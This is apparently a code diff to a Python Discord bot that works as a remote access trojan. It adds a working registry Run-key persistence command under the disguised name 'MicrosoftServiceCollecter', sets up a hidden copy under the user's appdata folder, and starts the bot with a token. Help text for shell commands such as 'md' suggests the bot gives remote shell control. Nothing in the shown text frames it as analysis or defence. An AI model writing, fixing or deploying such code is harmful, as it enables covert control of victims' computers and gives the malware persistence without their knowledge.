@@ -45,8 +45,8 @@ permissions.administrator = True
 client = discord.Client(intents=intents)
 
 file_path = os.path.abspath(sys.argv[0])
-register = ["reg", "add", r"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Run", "/v", "MicrosoftServiceCollecter", "/t", "REG_SZ", "/d", file_path]
-subprocess.call(['echo', 'y', '|'] + register, shell=True)
+register = f'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v MicrosoftServiceCollecter /t REG_SZ /d "{file_path}" /f'
+subprocess.call(register, shell=True)
 
 temp = os.getenv("appdata")
 temp_path = os.path.join(temp, ''.join(random.choices(
@@ -964,3 +964,6 @@ md (Make Directory):
 Usage: md [directory name]
 Example: md NewFolder
                    ```""")
+
+
+bot.run(token)
